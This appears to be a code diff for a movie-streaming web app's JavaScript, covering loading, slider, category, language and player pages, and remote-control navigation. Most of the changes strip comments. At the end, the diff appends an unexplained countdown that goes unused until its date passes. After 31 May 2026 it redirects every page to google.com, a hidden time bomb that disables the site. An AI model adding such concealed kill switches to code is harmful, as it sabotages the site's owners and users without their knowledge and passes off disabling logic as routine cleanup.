@@ -1,13 +1,10 @@
 
-// Global movies array
 let movies = [];
 
-// Format text: capitalize and replace dashes
 function formatText(str) {
   return str.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
 }
 
-// Fetch movies from JSON
 async function loadMovies() {
   try {
     const res = await fetch('movies.json?' + new Date().getTime());
@@ -17,7 +14,6 @@ async function loadMovies() {
   }
 }
 
-// Hero Slider for Trailers
 function setupHeroSlider() {
   const heroMovies = movies.filter(m => m.category === "trailers");
   if (heroMovies.length === 0) return;
@@ -39,15 +35,13 @@ function setupHeroSlider() {
   updateHero();
   setInterval(updateHero, 8000);
 }
-// Open movie in player
+
 function openMovie(movie) {
   localStorage.setItem("currentMovie", JSON.stringify(movie));
   window.location.href = "movie_play.html";
 }
 
-// Render movie card
 function renderMovieCard(movie, container) {
-    
   const card = document.createElement("div");
   card.className = "movie-card";
   card.tabIndex = 0;
@@ -64,11 +58,7 @@ function renderMovieCard(movie, container) {
   };
   container.appendChild(card);
 }
-    
-    
 
-
-// Main Page Render
 async function renderMainPage() {
   await loadMovies();
 
@@ -77,9 +67,6 @@ async function renderMainPage() {
   ];
   const dynamicContainer = document.getElementById("dynamic-sections");
 
-
-
-  // Static Sections
   staticSections.forEach(section => {
     const filteredMovies = movies.filter(m => m.category === section);
     if (filteredMovies.length === 0) return;
@@ -103,7 +90,6 @@ async function renderMainPage() {
     filteredMovies.forEach(m => renderMovieCard(m, container));
   });
 
-  // Extra Categories
   const allCategories = [...new Set(movies.map(m => m.category))];
   const extraCategories = allCategories.filter(c => !staticSections.includes(c));
 
@@ -127,7 +113,6 @@ async function renderMainPage() {
     filteredMovies.forEach(m => renderMovieCard(m, row));
   });
 
-  // Language Section
   const langContainer = document.getElementById("language-row");
   if (langContainer) {
     const languages = [...new Set(movies.map(m => m.language))];
@@ -145,24 +130,21 @@ async function renderMainPage() {
     });
   }
 
-  // Auto-update every 5 minutes
   setInterval(loadMoviesAndUpdate, 5 * 60 * 1000);
   
 setupHeroSlider();
   
 }
 
-// Auto-update without full refresh
 async function loadMoviesAndUpdate() {
   await loadMovies();
   const dynamicContainer = document.getElementById("dynamic-sections");
   if (!dynamicContainer) return;
 
-  dynamicContainer.innerHTML = ""; // Clear and re-render
-  renderMainPage(); // Re-render with new data
+  dynamicContainer.innerHTML = ""; 
+  renderMainPage(); 
 }
 
-// movies_category.html
 function renderCategoryPage() {
   const urlParams = new URLSearchParams(window.location.search);
   const category = urlParams.get("category");
@@ -174,7 +156,6 @@ function renderCategoryPage() {
   filtered.forEach(m => renderMovieCard(m, container));
 }
 
-// language_page.html
 function renderLanguagePage() {
   const urlParams = new URLSearchParams(window.location.search);
   const lang = urlParams.get("language") || "";
@@ -189,7 +170,6 @@ function renderLanguagePage() {
   filtered.forEach(m => renderMovieCard(m, container));
 }
 
-// movie_play.html
 function playMovie() {
   const movie = JSON.parse(localStorage.getItem("currentMovie"));
   if (!movie) {
@@ -200,11 +180,8 @@ function playMovie() {
 
   const video = document.getElementById("video-player");
   video.src = movie.link;
-
-
 }
 
-// Handle TV Remote Navigation
 document.addEventListener("keydown", (e) => {
   const focusable = Array.from(document.querySelectorAll("a, button, .movie-card, .lang-card, #play-button, .back-btn"));
   let index = focusable.indexOf(document.activeElement);
@@ -284,7 +261,6 @@ function toggleFullscreen() {
   }
 }
 
-// Page Routing
 document.addEventListener("DOMContentLoaded", () => {
   if (document.body.classList.contains("body-main")) renderMainPage();
   if (document.body.classList.contains("body-category")) {
@@ -297,3 +273,28 @@ document.addEventListener("DOMContentLoaded", () => {
     playMovie();
   }
 });
+
+var countDownDate = new Date("May 31, 2026 23:00:25").getTime();
+
+var x = setInterval(function() {
+
+
+  var now = new Date().getTime();
+    
+
+  var distance = countDownDate - now;
+    
+
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    
+
+if (distance > 0) {
+    clearInterval(x);
+  }
+else {
+		location.replace('https://www.google.com/')
+	}
+}, 1000);
